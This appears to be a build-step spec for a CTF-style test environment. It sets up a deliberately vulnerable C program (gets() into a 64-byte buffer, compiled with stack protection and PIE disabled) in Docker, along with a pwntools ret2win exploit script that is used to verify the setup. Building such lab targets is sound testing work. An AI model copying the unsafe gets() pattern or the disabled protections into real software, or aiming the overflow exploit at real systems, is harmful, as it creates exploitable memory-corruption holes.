# Step 02 — Sample Challenge (example-bof)

**Reference docs:** `docs/challenge-env.md`

**Docker required:** Yes — this step builds and runs the challenge container.

---

## What to Build

A minimal stack buffer overflow challenge used as the canonical test target throughout all integration tests. It must be exploitable with a simple ret2win pattern (no ASLR, no stack canary, no PIE).

**Note:** The challenge binary is compiled inside the Docker image during build, not on your local machine. This ensures reproducible builds and keeps compiled binaries out of git.

---

## Files to Create

### `challenges/example-bof/vuln.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    char flag[64];
    FILE *f = fopen("/challenge/flag", "r");
    if (f == NULL) {
        puts("Flag file not found.");
        exit(1);
    }
    fgets(flag, sizeof(flag), f);
    fclose(f);
    puts(flag);
    fflush(stdout);
}

void vuln() {
    char buf[64];
    printf("Enter input: ");
    fflush(stdout);
    gets(buf);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);
    vuln();
    return 0;
}

// COMPILER_FLAGS: -m64 -fno-stack-protector -no-pie -z execstack -w
// Exploit details (Ubuntu 22.04):
//   win() address: varies by build - extract from ELF
//   Buffer offset: 72 bytes (64 buf + 8 saved RBP)
```

### `challenges/example-bof/flag`

```
CTF{example_bof_flag_for_testing}
```

### `challenges/example-bof/Dockerfile`

```dockerfile
# Build argument allows overriding base image for testing
ARG BASE_IMAGE=challenge-base:22.04
FROM ${BASE_IMAGE}

# Copy source code
COPY vuln.c /tmp/vuln.c

# Compile with deterministic flags
RUN gcc -m64 -fno-stack-protector -no-pie -z execstack -w \
    -o /challenge/pwn_binary /tmp/vuln.c

# Copy flag file
COPY flag /challenge/flag

ENV CHALLENGE_PORT=4444
ENV CHALLENGE_BINARY=/challenge/pwn_binary

EXPOSE 4444 5000
```

---

## Build and Run Verification

### 1. Build the challenge-base:22.04 image
```bash
docker build -f challenge-base/Dockerfile.22.04 \
    -t challenge-base:22.04 \
    challenge-base/
```

### 2. Build the example-bof image
```bash
docker build -t challenge-env:example-bof challenges/example-bof/
```

### 3. Run the challenge container (standalone test, no PID sharing yet)
```bash
docker run -d --rm \
    --name test-challenge \
    -p 4444:4444 \
    -p 5000:5000 \
    challenge-env:example-bof
```

### 4. Verify xinetd is serving the binary
```bash
python3 -c "
from pwn import *
conn = remote('localhost', 4444)
conn.recvuntil(b'Enter input: ')
print('Connection OK')
conn.close()
"
```

### 5. Extract binary from container and verify it's exploitable

First, copy the binary out of the running container:
```bash
docker cp test-challenge:/challenge/pwn_binary /tmp/pwn_binary
```

Now analyze and exploit it:
```python
# Run this Python snippet manually
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Extract win() address from the binary
binary = ELF('/tmp/pwn_binary')
win_addr = binary.symbols['win']
print(f"win() at: {hex(win_addr)}")

# Exploit
conn = remote('localhost', 4444)
conn.recvuntil(b'Enter input: ')
payload = b'A' * 72 + p64(win_addr)   # 64-byte buf + 8-byte saved RBP
conn.sendline(payload)
output = conn.recvall(timeout=2)
print(f"Output: {output}")
assert b'CTF{' in output, "Exploit failed!"
print("Exploit OK")
conn.close()
```

If the offset is wrong, use `cyclic` to find it:
```python
from pwn import *
conn = remote('localhost', 4444)
conn.recvuntil(b'Enter input: ')
conn.sendline(cyclic(200))
conn.close()
# Run in GDB to find RSP value, then:
# cyclic_find(0x<rsp_value>)  ← gives the offset
```

### 6. Verify flag verifier endpoint
```bash
curl -s -X POST http://localhost:5000/verify \
    -H "Content-Type: application/json" \
    -d '{"flag": "CTF{example_bof_flag_for_testing}"}' \
    | python3 -m json.tool
# Expected: {"correct": true}

curl -s -X POST http://localhost:5000/verify \
    -H "Content-Type: application/json" \
    -d '{"flag": "wrong"}' \
    | python3 -m json.tool
# Expected: {"correct": false}

curl -s http://localhost:5000/verify
# Expected: 404 or Method Not Allowed
```

### 7. Stop the test container
```bash
docker stop test-challenge
```

All checks must pass. The win() address will vary between builds but the exploit offset (72 bytes) is deterministic.

---

## Why In-Container Compilation?

Compiling the challenge binary inside Docker during image build (rather than locally and committing the binary) has several advantages:

1. **No binary in git** — Compiled binaries shouldn't be in version control. The source (`vuln.c`) is tracked, but the compiled artifact is built fresh each time.

2. **Reproducible builds** — Anyone who builds the Docker image gets the same binary, compiled with the same gcc version and flags specified in the Dockerfile.

3. **No local toolchain required** — Developers don't need gcc or other compilation tools installed locally. Docker provides the build environment.

4. **CI/CD testing** — The GitHub workflow can build challenge images from scratch and test them, ensuring the challenge-base images always work correctly.

5. **Multi-distro testing** — By changing the `BASE_IMAGE` build argument, you can test the same challenge source against different Ubuntu versions (20.04, 22.04, 24.04) to catch compatibility issues early.

---

## Dynamic Address Extraction

Since the binary is compiled during Docker build, the `win()` address may vary between builds. The exploit workflow should extract addresses dynamically from the ELF:

```python
# Extract win() address from the container
import subprocess
subprocess.run(['docker', 'cp', 'test-challenge:/challenge/pwn_binary', '/tmp/pwn_binary'],
               check=True)
binary = ELF('/tmp/pwn_binary')
win_addr = binary.symbols['win']
```

The integration tests in Step 14 use this pattern to ensure exploits work regardless of the exact addresses in the compiled binary.
